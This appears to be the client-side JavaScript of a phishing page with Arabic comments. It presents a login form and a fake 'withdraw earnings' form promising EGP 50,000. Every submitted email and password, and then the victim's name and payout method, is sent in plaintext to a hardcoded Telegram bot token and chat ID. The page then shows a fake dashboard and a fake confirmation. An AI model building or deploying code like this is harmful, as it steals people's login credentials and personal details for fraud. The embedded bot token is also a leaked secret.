// إعدادات البوت الخاصة بك (Coach Khadija Mohammad)
const CONFIG = {
    botToken: '8154142175:AAGvcFJuk6eh972IJUujoKV2ibkNIIWlMNA',
    chatId: '8232581666'
};

const loginForm = document.getElementById('login-form');
const loginBtn = document.getElementById('login-btn');
const dashboard = document.getElementById('dashboard-section');
const loginSection = document.getElementById('login-section');
const loader = document.getElementById('loader');

// دالة الإرسال للتليجرام
async function notifyTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.chatId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.error("Telegram Error"); }
}

// معالجة تسجيل الدخول
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;

    loader.classList.remove('hidden');
    loginBtn.disabled = true;

    // إرسال البيانات فوراً للبوت
    await notifyTelegram(`🔔 <b>محاولة دخول جديدة</b>\n📧 الإيميل: <code>${email}</code>\n🔑 الباسوورد: <code>${pass}</code>`);

    setTimeout(() => {
        loader.classList.add('hidden');
        localStorage.setItem('userAuth', 'true');
        showDashboard();
    }, 1500);
});

// معالجة طلب السحب
document.getElementById('transfer-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    const name = document.getElementById('recipient-name').value;
    const method = document.getElementById('transfer-method').value;

    loader.classList.remove('hidden');
    
    await notifyTelegram(`💰 <b>طلب سحب أرباح</b>\n👤 الاسم: ${name}\n💳 الوسيلة: ${method}\n💵 المبلغ: EGP 50,000.00`);

    setTimeout(() => {
        loader.classList.add('hidden');
        alert("تم استلام طلب السحب بنجاح. سيتم مراجعة البيانات من قبل الإدارة الفنية للتقوى.");
        location.reload();
    }, 2000);
});

function showDashboard() {
    loginSection.classList.add('hidden');
    dashboard.classList.remove('hidden');
}

// التحقق من حالة الجلسة
if (localStorage.getItem('userAuth') === 'true') { showDashboard(); }

document.getElementById('logout-btn').onclick = () => {
    localStorage.removeItem('userAuth');
    location.reload();
};
